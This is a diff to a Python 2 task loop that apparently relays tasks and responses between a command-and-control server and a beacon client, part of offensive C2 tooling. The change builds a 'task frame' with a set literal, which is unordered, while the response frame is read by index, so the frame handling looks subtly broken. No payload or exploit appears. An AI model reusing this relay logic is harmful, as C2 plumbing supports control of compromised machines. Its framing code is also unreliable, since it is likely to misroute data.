@@ -9,6 +9,7 @@ import beacon
 import threading
 import queue
 
+
 def importModule(modName, modType):
 	"""
 	Imports a passed module as either an 'encoder' or a 'transport'; called with either encoder.X() or transport.X()
@@ -55,17 +56,20 @@ def task_loop(beacon_obj):
 
 		newTask = establishedSession.checkForTasks(beacon_obj.sock)
 
+		# Stuff task into data model
+		task_frame = {beacon_obj.beacon_id, newTask}
 		# once we have a new task (even an empty one), lets relay that to our client
 		if config.debug:
 			print commonUtils.color("Beacon {}: Encoding and relaying task to client", status=False, yellow=True).format(beacon_obj.beacon_id)
-		establishedSession.relayTask(newTask)
+		establishedSession.relayTask(task_frame)
 		# Attempt to retrieve a response from the client
 		if config.verbose:
 			print commonUtils.color("Beacon {}: Checking the client for a response...").format(beacon_obj.beacon_id)
-		b_response = establishedSession.checkForResponse()
+		b_response_frame = establishedSession.checkForResponse()
+		b_response_data = b_response_frame[1]
 
 		# Let's relay this response to the c2 server
-		establishedSession.relayResponse(beacon_obj.sock, b_response)
+		establishedSession.relayResponse(beacon_obj.sock, b_response_data)
 		sleep(beacon_obj.block_time / 100)  # python sleep is in seconds, C2_BLOCK_TIME in milliseconds
 
 def main():
